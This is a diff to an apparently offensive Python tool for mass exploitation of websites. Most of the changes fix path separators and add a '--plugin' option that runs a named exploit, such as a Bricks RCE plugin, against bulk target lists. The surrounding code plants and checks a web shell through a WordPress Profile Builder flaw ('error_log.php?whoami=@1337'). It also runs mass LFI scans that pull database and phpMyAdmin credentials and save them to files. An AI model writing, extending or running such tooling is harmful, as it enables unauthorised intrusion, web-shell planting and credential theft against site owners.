@@ -42,7 +42,7 @@ def Generate_ResultFolder():
     except:
         pass 
     try:
-        os.makedirs(r"DB_Results\Domain_Technology", exist_ok=True) 
+        os.makedirs(r"DB_Results/Domain_Technology", exist_ok=True) 
     except:
         pass 
 Generate_ResultFolder()
@@ -59,7 +59,7 @@ NO_USED = None
 
 
 
-with open(r"Config\config.json", "r") as f:
+with open(r"Config/config.json", "r") as f:
     config_json = json.load(f)
 
 # CFG_DETECT_MULTI_CMS = config_json['TECHNOLOGY']['Detect_All_CMS']
@@ -643,8 +643,8 @@ class CVE_Exploiter:
                         if 'url' and 'filename' and 'editLink' in str(REZ_PROFILEBUILDER['resp'].text):
                             if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/uploads/{datetime.now().year}/{datetime.now().strftime('%m')}"/error_log.php?whoami=@1337', self.Config_UA): 
                                 Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Weclome SHELL') 
-                        else:
-                            Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Failed SHELL') 
+                        # else:
+                        #     Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Failed SHELL') 
                     else:
                         Core_Helper.Printed_Value.Log_Fail(REZ_PROFILEBUILDER['domain'], f"[WP] UserProfile_Builder | Failed") 
                 else:
@@ -766,7 +766,6 @@ def Scan_Plugin(Target): #From Plugin Manager
 
 
 
-
 def Runner_CMSID(domain, Proxies):
     try:
         TARGET = domain
@@ -777,7 +776,7 @@ def Runner_CMSID(domain, Proxies):
             if TAR_PRO:
                 Core_Helper.Printed_Value.Log_Fail(
                     TAR_PRO, f'[CMS:{WHATISCMS}]')
-                Saved_Result(r'DB_Results\Domain_Technology\Unknown_ID.txt', f'{TAR_PRO}\n')
+                Saved_Result(r'DB_Results/Domain_Technology/Unknown_ID.txt', f'{TAR_PRO}\n')
             
             return TAR_PRO, 'Unknown_ID', False 
         
@@ -809,7 +808,6 @@ def Runner_CMSID(domain, Proxies):
         return None, None, None
     except:
         return None, None, None
-    
 def MASS_LFI(tar_url, paths, max_workers, stop_on_first=True, Proxies_ON=NO_USED, FOUND_CMS=NO_USED):
     try:    
         Found_res = False
@@ -836,7 +834,7 @@ def MASS_LFI(tar_url, paths, max_workers, stop_on_first=True, Proxies_ON=NO_USED
                             Core_Helper.Printed_Value.Log_Success(tar_url, f"[LFI] {LFI_Results[4]}")
                             TARGET_URL = urljoin(tar_url, vuln_path)
                             
-                            Saved_Result(r"DB_Results\Result_LFI.txt", f"\nLFI Vuln: {TARGET_URL}\n"
+                            Saved_Result(r"DB_Results/Result_LFI.txt", f"\nLFI Vuln: {TARGET_URL}\n"
                                                         f"DB_Name: {DB_NAME}\n"
                                                         f"DB_User: {PMA_USER}\n"
                                                         f"DB_Passwd: {PMA_PASSWD}\n"
@@ -852,7 +850,7 @@ def MASS_LFI(tar_url, paths, max_workers, stop_on_first=True, Proxies_ON=NO_USED
 
                                 if PMA_Mod.PMA_LOGATTACK:
                                     Core_Helper.Printed_Value.Log_Success(tar_url, f"[PMA] PhpMyAdmin | PMA Accessed") 
-                                    Saved_Result(r"DB_Results\PhpMyAdmin_Logged.txt", f"PMA: {TARGET_URL}\nPMA_User: {PMA_USER}\nPMA_Pass: {PMA_PASSWD}\n************************************\n")
+                                    Saved_Result(r"DB_Results/PhpMyAdmin_Logged.txt", f"PMA: {TARGET_URL}\nPMA_User: {PMA_USER}\nPMA_Pass: {PMA_PASSWD}\n************************************\n")
 
                                 else:
                                     Core_Helper.Printed_Value.Log_Fail(tar_url, f"[PMA] PhpMyAdmin | Failed") 
@@ -936,7 +934,7 @@ def Brain_Bot(targets):
         Core_Helper.Printed_Value.Log_Error("Error Brain_Bot :", str(er))  
 
 def main():
-    Burnning(Screen)     
+    #Burnning(Screen)     
     Listen_Commander()    
 
 
@@ -949,6 +947,7 @@ def Listen_Commander():
         epilog=" [ Example ] \n"
                f" ***********  python3 {sys.argv[0]} --attack targets.txt\n" \
                f" ***********  python3 {sys.argv[0]} list_plugin --list targets.txt\n" \
+               f" ***********  python3 {sys.argv[0]} list_plugin --plugin WP_Bricks_RCE_196 --list targets.txt\n" \
                f" ***********  python3 {sys.argv[0]} list_plugin --target http://evil_host.com\n" \
                f" ***********  python3 {sys.argv[0]} install_plugin\n" \
                f" ***********  python3 {sys.argv[0]} ui_config\n" \
@@ -984,6 +983,10 @@ def Listen_Commander():
     list_parser.add_argument(
         "--list",
         help="Give-ME : Multi-Target with File (Bulk) *.txt"
+    )
+    list_parser.add_argument(
+        "--plugin",
+        help="Give-ME : Direct CommandLine without choose Plugin Ex: Plugin_Name"
     )
 
     #command : install_plugin 
@@ -1022,15 +1025,24 @@ def Listen_Commander():
                 
                 Plugin_Manager.Plugin_Selected([args.target], Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS) 
 
+            elif args.plugin and args.list:
+                #print(args.plugin)
+
+                with open(args.list, encoding='utf-8') as file_txt:
+                    targets = [line.strip() for line in file_txt if line.strip()]
+                
+                Plugin_Manager.Plugin_Selected(targets, Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS, f'Plugins_Exploiter/{args.plugin}')
+
             elif args.list:
 
                 if not os.path.exists(args.list):
                     Core_Helper.Printed_Value.Log_Error("Retry Check Target .txt not found", f"{args.list}")
                     return
+                
                 with open(args.list, encoding='utf-8') as file_txt:
                     targets = [line.strip() for line in file_txt if line.strip()]
                 
-                Plugin_Manager.Plugin_Selected(targets, Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS)
+                Plugin_Manager.Plugin_Selected(targets, Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS, NO_USED)
             
             else:
                 Core_Helper.Printed_Value.Log_Info("You need use", "--target or --list.")
